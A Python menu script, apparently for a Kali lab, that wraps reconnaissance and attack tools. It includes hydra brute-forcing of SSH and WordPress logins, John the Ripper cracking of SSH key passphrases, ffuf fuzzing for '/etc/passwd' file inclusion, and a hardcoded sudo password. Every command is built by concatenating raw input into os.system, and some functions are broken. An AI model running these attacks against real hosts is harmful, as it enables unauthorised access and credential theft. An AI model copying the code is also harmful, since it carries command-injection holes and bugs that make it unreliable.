# library to access linux commands
import os
ipaddress = ""

def ipadd():
    global ipaddress
    temp_ipaddress = str(input("Enter ip address of host ["  + ipaddress + "]:"))
    if len(temp_ipaddress) > 0:
       ipaddress = temp_ipaddress
    print(ipaddress)
    return ipaddress


def iface():
    interface = str(input("Enter interface name[eth0]: "))
    if len(interface) == 0:
        interface = "eth0"
    print(interface)
    return interface


def url():
    urll = str(input("Enter url of target :"))
    return urll


def subnet():
    ipsubnet = str(input("Enter IP Subnet: "))
    return ipsubnet


def enum():
    os.system("enum4linux -a " + ipadd())


def john():
    print("Running John the Ripper")
    print("Assuming file:key has been created")
    print("Creating file:hash from file:key using john:")
    os.system("ssh2john key > hash")
    print("Cracking password from file:hash using rockyou.txt")
    os.system("john -w=/usr/share/wordlists/rockyou.txt hash")
    print("With this private key password, you now can use it on key on [ssh -i key user@host]")
    print(" goto http://unix4lyfe.org to generate Hash")


def fuzz():
    os.system("ffuf -u '" + url() + "?FUZZ=/etc/passwd’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0")

def port():
    temp_port = input("Enter port [80]")
    if len(temp_port) == 0:
       port = "80"
    return(port)

def nikto():
    #ipa = input("Enter IP address: ")
    #os.system("nikto -C all -h " + ipa)
    command = "nikto -C all -h " + ipadd() + " -p " + port()
    print("Excuting the following command")
    print("\033[91m" + f"{command}")
    os.system(command)
    print("\033[0m")

def dirb():
    choice = input("[1] = http\n[2] = https\nEnter choice: ")
    if choice == "1":
        os.system("dirb http://" + url() + ":" + port() + "/")
    elif choice == "2":
        os.system("dirb https://" + url() + ":" + port() + "/")
    else:
        print("Invalid choice")


def harvester():
    os.system("theHarvester -l 500 -d " + ipadd() + " -b google")

#temp
def hydra():
    service = input("Enter service ssh/telnet/wpa :")
    if service != "wpa":
        command = "hydra -L user.txt -P pass.txt " + ipadd() + " " + service + " -s " + port() + " -t 4"
        print(f"{command}")
        os.system(command)
    else:
        loginname = input("Enter username or enter X to use user.txt :")
        password = input("Enter password or enter X to use pass.txt :")
        if ((loginname == "X") or (loginname == "x")) and (password == "X" or password == "x"):
            command =  "hydra -L user.txt -P pass.txt " + ipadd() + " http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'"
            print(f"{command}")
            os.system(command)
        elif ((loginname == "X" or loginname == "x") and (password != "X" or password != "x")):
            command = "echo " + password + " > pass.txt"
            print(f"{command}")
            os.system(command)
            command = "hydra -L user.txt -P pass.txt " + ipadd() + " vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'"
            print(f"{command}")
            os.system(command)
        else:
            command = "echo " + loginname + " > user.txt"
            print(f"{command}")
            os.system(command)
            command = "hydra -L user.txt -P pass.txt " + ipadd() + " http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'"
            print(f"{command}")
            os.system(command)

def smbclient():
    command = "smbclient -L " + ipadd()
    print(f"{command}")
    os.system(command)

def nmap():
    ques = input("Would you like to save to a file [y/n]: ")
    if ques == "y" or ques == "Y":
        filename = input("Enter filename: ")
    else:
        filename = "results.xml"
    # ipadd = input("Enter ip address of host: ")
    os.system("sudo nmap -p- -sC -sV -oX " + filename + " " + ipadd())
    ques2 = input("Would like you like to see result firefox [y/n]: ")
    if ques2 == "y" or ques == "Y":
        os.system("xsltproc " + filename + " -o temp.html")
        os.system("firefox " + "temp.html")


# function data creates user.txt and pass.txt
def userpass():
    counter = 1  # count how many words inputed
    keylist = []  # init variables
    new_list = ''
    new_keylist = []
    pass_list = []
    # start loop to keep adding words
    while True:
        keyword = input("Enter keyword, x to stop\n")
        # if user exits without entering data then stop
        if (keyword == "x") and (counter == 1):
            print("\nExit no words entered\n")
            break
        # check if user has finished entering data
        if (keyword == "x") and (counter != 1):
            print("Creating user.txt and pass.txt")
            # calculate how many entries
            count = len(keylist) - 1
            print(str(count + 1) + " words created.")
            # store each word temporarily
            templist = list(keylist)
            # repeat words in the last
            for i in range(count):
                keylist.extend(templist)
            # print(keylist) used for testing
            new_data = open("/home/kali/recon/test.txt", "w")
            # convert list to text
            for x in new_keylist:
                new_list += str(x) + '\n'
            new_data = open("/home/kali/recon/user.txt", "w")
            # add new line to each name
            for x in keylist:
                new_list += x + '\n'
            # print(new_list) used for testing
            # save data to file
            new_data.write(str(new_list))
            # create pass.txt
            for y in range(count + 1):
                for z in range(count + 1):
                    pass_list.append(keylist[y])
            # print(pass_list) used for testing
            # convert list to text
            # re-intialize list
            new_list = ''
            for x in pass_list:
                new_list += str(x) + '\n'
            new_data = open("/home/kali/recon/pass.txt", "w")
            # save data to file
            new_data.write(str(new_list))
            break
        # add new word to list
        keylist.append(keyword)
        # increment counter
        counter += 1


# converts text file to binary
# input to function is the data to be converted
def convert2binary(data1):
    # convert to binary file
    savefile = input("Name of file to save: ")
    file_bytearray = bytearray.fromhex(data1)
    # save contents to *.jpg
    new_file = open("/home/kali/recon/" + savefile, "wb")
    new_file.write(file_bytearray)
    print("File saved as " + savefile)
    print("File type of converted file....")
    os.system("file " + savefile)


# function that loads the file to be converted
# and performs checks
def hexconvert():
    filename = input("Enter name of suspect /dir/file: ")
    if not (os.path.exists(filename)):
        print("File does not exist")
        return
    print("File type of suspect file...")
    os.system("file " + filename + "\n")
    with open('/home/kali/recon/' + filename, 'r') as file:
        data = file.read()
    # Check to see if file contains 0x
    first_two = data[:2]
    if (first_two == "0x"):
        print("Removing 0x, commas and spaces")
        # remove 0x
        data = data.replace("0x", "")
        # remove white spaces
        data = ''.join(data.split())
        # remove comma seperators
        data = data.replace(',', '')
        convert2binary(data)
    else:
        # 0x NOT present just remove spaces")
        print("Removing spaces")
        data = ''.join(data.split())
        convert2binary(data)


# function that performs arp-scan and linux
# enter subnet
def arpscan():
    result = os.system("echo kali | sudo arp-scan --interface=" + iface() + " " + subnet())
    print("Success! ")
    print(result)
    pause_1  = input("Press any ENTER to continue")

# Function that downloads files from given host
def webcrawl():
    command = "wget -r --no-parent -R 'index.html*' http://" + ipadd()
    print(f"Excuting following command\n {command}")
    os.system(command)
    print("\nSuccess! ")
    print("\nFiles are stored under directory named " +  ipaddress + "\n")
    os.system("ls -la ./" + ipaddress )


def banner():
    print("\n")
    print(" _ __   ___| |_ _ __ ___  ___ ___  _ __  _ __  ")
    print("| '_ \ / _ \ __| '__/ _ \/ __/ _ \| '_ \| '_ \ ")
    print("| | | |  __/ |_| | |  __/ (_| (_) | | | | | | |")
    print("|_| |_|\___|\__|_|  \___|\___\___/|_| |_|_| |_|")
    print("\n")


# Main menu
banner()

while True:
    print("##########################")
    print("# Network Reconnaissance #")
    print("##########################")
    print("[1] Scan devices on subnet")
    print("[2] Webcrawl download files")
    print("[3] Convert files to binary")
    print("[4] Create username password files")
    print("[5] Run nmap")
    print("[6] Run hydra")
    print("[7] Run smbclient")
    print("[8] Run theHarvester")
    print("[9] Run dirbuster")
    print("[A] Run FUZZ")
    print("[B] Run nikto")
    print("[C] Run JohnTR")
    print("[D] Run Enum4linux")
    print("[X] to exit")
    ans = input("Input your selection :")
    if (ans == "1"):
        arpscan()
    elif (ans == "2"):
        webcrawl()
    elif (ans == "3"):
        hexconvert()
    elif (ans == "4"):
        userpass()
    elif (ans == "5"):
        nmap()
    elif (ans == "6"):
        hydra()
    elif (ans == "7"):
        smbclient()
    elif (ans == "8"):
        harvester()
    elif (ans == "9"):
        dirb()
    elif (ans == "A") or (ans == "a"):
        fuzz()
    elif (ans == "B") or (ans == "b"):
        nikto()
    elif (ans == "C") or (ans == "c"):
        john()
    elif (ans == "D") or (ans == "d"):
        enum()
    elif (ans == "x") or (ans == "X"):
        print("Goodbye")
        break
    else:
        print("Invalid entry")
